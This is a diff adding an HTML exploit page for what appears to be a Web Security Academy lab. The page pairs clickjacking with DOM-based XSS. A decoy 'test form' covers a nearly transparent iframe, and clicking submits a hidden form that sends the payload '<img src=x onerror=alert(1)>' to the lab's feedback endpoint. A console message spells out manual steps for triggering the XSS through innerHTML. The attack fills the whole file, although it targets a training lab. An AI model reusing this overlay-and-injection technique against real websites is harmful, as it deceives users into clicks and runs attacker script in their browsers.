@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test Page</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: Arial, sans-serif;
+        }
+        
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 10;
+        }
+        
+        #iframe-container {
+            position: relative;
+            width: 100%;
+            height: 100vh;
+        }
+        
+        #target-frame {
+            width: 100%;
+            height: 100%;
+            border: none;
+            opacity: 0.0001;
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 20;
+        }
+        
+        .decoy-content {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 15;
+            background: white;
+            padding: 50px;
+            box-sizing: border-box;
+        }
+        
+        .fake-form {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        
+        .fake-form h1 {
+            color: #333;
+            text-align: center;
+        }
+        
+        .form-group {
+            margin: 20px 0;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        
+        .form-group input,
+        .form-group textarea {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        
+        .form-group textarea {
+            resize: vertical;
+            height: 150px;
+        }
+        
+        .submit-btn {
+            background: #007bff;
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            display: block;
+            margin: 30px auto 0;
+        }
+        
+        .submit-btn:hover {
+            background: #0056b3;
+        }
+        
+        /* Hide decoy after a delay to reveal iframe */
+        .hide-decoy {
+            animation: fadeOut 0.5s forwards;
+        }
+        
+        @keyframes fadeOut {
+            to {
+                opacity: 0;
+                pointer-events: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="iframe-container">
+        <div class="decoy-content" id="decoy">
+            <div class="fake-form">
+                <h1>Test Form Submission</h1>
+                <div class="form-group">
+                    <label>Name:</label>
+                    <input type="text" value="<img src=x onerror=alert(1)>" readonly style="background: #f0f0f0;">
+                </div>
+                <div class="form-group">
+                    <label>Email:</label>
+                    <input type="email" value="test@example.com" readonly style="background: #f0f0f0;">
+                </div>
+                <div class="form-group">
+                    <label>Subject:</label>
+                    <input type="text" value="Feedback" readonly style="background: #f0f0f0;">
+                </div>
+                <div class="form-group">
+                    <label>Message:</label>
+                    <textarea readonly style="background: #f0f0f0;">Test message</textarea>
+                </div>
+                <button class="submit-btn" onclick="revealIframe()">Submit Test</button>
+            </div>
+        </div>
+        
+        <iframe id="target-frame" src="about:blank"></iframe>
+    </div>
+    
+    <script>
+        // XSS payload that will execute when inserted via innerHTML
+        const xssPayload = "<img src=x onerror=alert(1)>";
+        
+        function revealIframe() {
+            // Load the vulnerable page with pre-filled data
+            const iframe = document.getElementById('target-frame');
+            const targetUrl = "https://0a3900c304b67111838b512800a90077.web-security-academy.net/feedback";
+            
+            // Create a form to submit to the iframe
+            const form = document.createElement('form');
+            form.method = 'GET';
+            form.action = targetUrl;
+            form.target = 'target-frame';
+            
+            // The payload will be in the name field
+            const nameInput = document.createElement('input');
+            nameInput.type = 'hidden';
+            nameInput.name = 'prefill_name';
+            nameInput.value = xssPayload;
+            form.appendChild(nameInput);
+            
+            document.body.appendChild(form);
+            form.submit();
+            document.body.removeChild(form);
+            
+            // Hide the decoy
+            document.getElementById('decoy').classList.add('hide-decoy');
+            
+            setTimeout(() => {
+                document.getElementById('target-frame').style.opacity = '1';
+                alert('Now fill in the form with the XSS payload shown above and submit!');
+            }, 1000);
+        }
+        
+        // Instructions for manual testing
+        console.log(`
+        To test the DOM XSS vulnerability:
+        1. Navigate to: https://0a3900c304b67111838b512800a90077.web-security-academy.net/feedback
+        2. In the Name field, enter: ${xssPayload}
+        3. Fill other fields with any valid data
+        4. Submit the form
+        5. The XSS will execute via innerHTML when displaying the feedback message
+        `);
+    </script>
+</body>
+</html>
